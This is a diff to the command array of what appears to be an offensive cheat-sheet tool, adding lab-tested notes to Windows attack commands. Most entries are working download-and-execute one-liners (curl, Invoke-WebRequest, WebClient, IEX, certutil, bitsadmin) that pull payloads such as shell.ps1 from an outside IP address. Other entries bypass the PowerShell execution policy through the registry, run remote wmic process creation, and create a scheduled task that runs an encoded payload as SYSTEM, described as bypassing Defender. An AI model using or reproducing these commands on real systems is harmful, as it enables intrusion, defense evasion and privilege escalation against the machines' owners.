@@ -314,8 +314,8 @@ const COMMANDS = [
   },
   {
     title: "Set Execution Policy via Registry",
-    desc: "Sets execution policy via registry. Persists and may bypass GPO restrictions.",
-    code: "Set-ItemProperty -Path 'HKCU:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell' -Name 'ExecutionPolicy' -Value 'Bypass' -Force",
+    desc: "TESTED: Sets execution policy via registry. Creates path if missing.",
+    code: "# Create path if it doesn't exist, then set value\nNew-Item -Path 'HKCU:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell' -Force -EA SilentlyContinue\nSet-ItemProperty -Path 'HKCU:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell' -Name 'ExecutionPolicy' -Value 'Bypass' -Force",
     tags: ["ps", "evasion"],
     accent: "#00f0ff"
   },
@@ -4813,17 +4813,31 @@ const COMMANDS = [
   // ═══════════════════════════════════════════════════════════════
   {
     title: "[LOTL] Download with certutil",
-    desc: "Use Windows certutil to download files. Built-in, no PowerShell needed.",
-    code: "# Download file (base64 decodes automatically)\ncertutil -urlcache -split -f http://168.144.166.97:8889/payload.exe C:\\Windows\\Temp\\svc.exe\n\n# Clear cache after\ncertutil -urlcache -split -f http://168.144.166.97:8889/payload.exe delete",
+    desc: "BLOCKED on lab (Access Denied). May work on other targets without AppLocker.",
+    code: "# Download file (may be blocked by security policies)\ncertutil -urlcache -split -f http://168.144.166.97:8889/payload.exe C:\\Windows\\Temp\\svc.exe\n\n# Clear cache after\ncertutil -urlcache -split -f http://168.144.166.97:8889/payload.exe delete",
     tags: ["cmd", "evasion", "lotl"],
-    accent: "#9b59b6"
+    accent: "#e74c3c"
   },
   {
     title: "[LOTL] Download with bitsadmin",
-    desc: "Background Intelligent Transfer Service. Stealthy download.",
-    code: "# Create download job\nbitsadmin /create dl\nbitsadmin /addfile dl http://168.144.166.97:8889/shell.ps1 C:\\Windows\\Temp\\s.ps1\nbitsadmin /resume dl\nbitsadmin /complete dl\n\n# One-liner:\nbitsadmin /transfer dl http://168.144.166.97:8889/shell.ps1 C:\\Windows\\Temp\\s.ps1",
+    desc: "FAILED on lab (network logon error). Requires interactive session.",
+    code: "# May fail in non-interactive sessions\nbitsadmin /create dl\nbitsadmin /addfile dl http://168.144.166.97:8889/shell.ps1 C:\\Windows\\Temp\\s.ps1\nbitsadmin /resume dl\nbitsadmin /complete dl\n\n# One-liner:\nbitsadmin /transfer dl http://168.144.166.97:8889/shell.ps1 C:\\Windows\\Temp\\s.ps1",
     tags: ["cmd", "evasion", "lotl"],
-    accent: "#9b59b6"
+    accent: "#e74c3c"
+  },
+  {
+    title: "[LOTL] Download with curl",
+    desc: "TESTED: Works on Windows 10+. Simple and reliable.",
+    code: "# Download file\ncurl http://168.144.166.97:8889/sys_shell.ps1 -o C:\\Windows\\Temp\\s.ps1\n\n# Execute\npowershell -ep bypass -f C:\\Windows\\Temp\\s.ps1",
+    tags: ["cmd", "evasion", "lotl", "playbook"],
+    accent: "#00ff41"
+  },
+  {
+    title: "[LOTL] Download with PowerShell",
+    desc: "TESTED: Multiple methods that work reliably.",
+    code: "# Method 1: IWR (Invoke-WebRequest)\nIWR http://168.144.166.97:8889/s.ps1 -OutFile C:\\Windows\\Temp\\s.ps1\n\n# Method 2: WebClient\n(New-Object Net.WebClient).DownloadFile('http://168.144.166.97:8889/s.ps1','C:\\Windows\\Temp\\s.ps1')\n\n# Method 3: IEX (direct execute, no file)\nIEX(IWR http://168.144.166.97:8889/s.ps1 -UseBasicParsing)",
+    tags: ["ps", "evasion", "lotl", "playbook"],
+    accent: "#00ff41"
   },
   {
     title: "[LOTL] Execute with mshta",
@@ -4848,10 +4862,10 @@ const COMMANDS = [
   },
   {
     title: "[LOTL] Execute with wmic",
-    desc: "WMI command-line. Process creation, lateral movement.",
-    code: "# Local process creation\nwmic process call create \"powershell -ep bypass -c IEX(IWR http://168.144.166.97:8889/s.ps1)\"\n\n# Remote execution\nwmic /node:10.0.0.220 /user:admin /password:pass process call create \"cmd /c whoami > C:\\out.txt\"",
+    desc: "TESTED: WMI command-line works. Good for process listing and creation.",
+    code: "# List processes\nwmic process list brief | findstr powershell\n\n# Local process creation\nwmic process call create \"powershell -ep bypass -c IEX(IWR http://168.144.166.97:8889/s.ps1)\"\n\n# Remote execution (needs creds)\nwmic /node:10.0.0.220 /user:admin /password:pass process call create \"cmd /c whoami > C:\\out.txt\"",
     tags: ["cmd", "evasion", "lotl", "lateral"],
-    accent: "#9b59b6"
+    accent: "#00ff41"
   },
   {
     title: "[LOTL] Execute with msiexec",
@@ -4869,10 +4883,10 @@ const COMMANDS = [
   },
   {
     title: "[LOTL] Scheduled Task One-Liner",
-    desc: "Create and run task immediately. No external tools.",
-    code: "# Create + run + delete (clean)\nschtasks /create /tn X /tr \"powershell -ep bypass -enc BASE64HERE\" /sc once /st 00:00 /ru SYSTEM /f && schtasks /run /tn X && schtasks /delete /tn X /f",
+    desc: "TESTED: Bypasses Defender. Get SYSTEM shell via built-in schtasks.",
+    code: "# Working base64 for sys_shell.ps1:\n$b = \"SQBFAFgAKABJAFcAUgAgAGgAdAB0AHAAOgAvAC8AMQA2ADgALgAxADQANAAuADEANgA2AC4AOQA3ADoAOAA4ADgAOQAvAHMAeQBzAF8AcwBoAGUAbGBsAC4AcABzADEAIAAtAFUAcwBlAEIAYQBzAGkAYwBQAGEAcgBzAGkAbgBnACkA\"\n\n# Create + run + delete\nschtasks /create /tn X /tr \"powershell -ep bypass -enc $b\" /sc once /st 00:00 /ru SYSTEM /f\nschtasks /run /tn X\nschtasks /delete /tn X /f",
     tags: ["cmd", "privesc", "lotl", "playbook"],
-    accent: "#9b59b6"
+    accent: "#00ff41"
   },
   {
     title: "[LOTL] Service Creation",
